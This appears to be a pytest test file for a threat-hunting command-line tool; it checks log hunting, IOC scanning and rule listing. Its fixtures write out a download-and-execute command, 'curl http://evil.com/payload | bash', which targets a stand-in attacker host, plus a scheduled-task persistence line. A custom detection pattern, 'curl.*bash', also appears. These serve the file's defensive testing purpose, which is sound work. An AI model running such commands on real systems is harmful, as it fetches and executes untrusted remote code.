"""Tests for project_99 CLI — Threat Hunting Toolkit."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from project_99.cli import cli


@pytest.fixture()
def runner() -> CliRunner:
    return CliRunner()


@pytest.fixture()
def malicious_log(tmp_path: Path) -> Path:
    f = tmp_path / "auth.log"
    f.write_text(
        "2024-01-01 INFO user login\n"
        "2024-01-01 WARN curl http://evil.com/payload | bash\n"
        "2024-01-01 INFO logout\n"
    )
    return f


@pytest.fixture()
def clean_log(tmp_path: Path) -> Path:
    f = tmp_path / "clean.log"
    f.write_text("2024-01-01 INFO normal log line\n2024-01-01 INFO another normal line\n")
    return f


class TestHuntCommand:
    def test_hunt_finds_match(self, runner: CliRunner, malicious_log: Path) -> None:
        result = runner.invoke(cli, ["hunt", str(malicious_log)])
        assert result.exit_code == 0
        assert "HUNT-002" in result.output

    def test_hunt_clean_log_no_matches(self, runner: CliRunner, clean_log: Path) -> None:
        result = runner.invoke(cli, ["hunt", str(clean_log)])
        assert result.exit_code == 0
        assert "Matches: 0" in result.output

    def test_hunt_output_json(self, runner: CliRunner, malicious_log: Path, tmp_path: Path) -> None:
        out = tmp_path / "report.json"
        result = runner.invoke(cli, ["hunt", str(malicious_log), "-o", str(out)])
        assert result.exit_code == 0
        assert out.exists()
        data = json.loads(out.read_text())
        assert "matches" in data

    def test_exit_code_on_critical(self, runner: CliRunner, malicious_log: Path) -> None:
        result = runner.invoke(cli, ["hunt", str(malicious_log), "--exit-code"])
        assert result.exit_code == 1

    def test_hunt_directory(self, runner: CliRunner, tmp_path: Path) -> None:
        (tmp_path / "a.log").write_text("schtasks /create /tn evil\n")
        result = runner.invoke(cli, ["hunt", str(tmp_path)])
        assert result.exit_code == 0
        assert "HUNT-004" in result.output

    def test_custom_rules_file(self, runner: CliRunner, malicious_log: Path, tmp_path: Path) -> None:
        rules_data = {
            "rules": [
                {"rule_id": "C001", "name": "curl", "severity": "CRITICAL",
                 "mitre_technique": "T1059", "patterns": ["curl.*bash"]}
            ]
        }
        rules_file = tmp_path / "rules.json"
        rules_file.write_text(json.dumps(rules_data))
        result = runner.invoke(cli, ["hunt", str(malicious_log), "--rules", str(rules_file)])
        assert result.exit_code == 0
        assert "C001" in result.output


class TestIocScanCommand:
    def test_ioc_scan_finds_hit(self, runner: CliRunner, tmp_path: Path) -> None:
        log = tmp_path / "net.log"
        log.write_text("connection from 10.99.0.1 detected\n")
        ioc_file = tmp_path / "iocs.jsonl"
        ioc_file.write_text('{"type": "ip", "value": "10.99.0.1"}\n')
        result = runner.invoke(cli, ["ioc-scan", str(log), "--iocs", str(ioc_file)])
        assert result.exit_code == 0
        assert "10.99.0.1" in result.output

    def test_ioc_scan_no_hits(self, runner: CliRunner, clean_log: Path, tmp_path: Path) -> None:
        ioc_file = tmp_path / "iocs.jsonl"
        ioc_file.write_text('{"type": "ip", "value": "10.99.0.1"}\n')
        result = runner.invoke(cli, ["ioc-scan", str(clean_log), "--iocs", str(ioc_file)])
        assert result.exit_code == 0
        assert "Hits: 0" in result.output


class TestListRulesCommand:
    def test_lists_rules(self, runner: CliRunner) -> None:
        result = runner.invoke(cli, ["list-rules"])
        assert result.exit_code == 0
        assert "HUNT-001" in result.output
        assert "HUNT-010" in result.output


class TestVersionOption:
    def test_version_flag(self, runner: CliRunner) -> None:
        result = runner.invoke(cli, ["--version"])
        assert result.exit_code == 0
        assert "0.1.0" in result.output
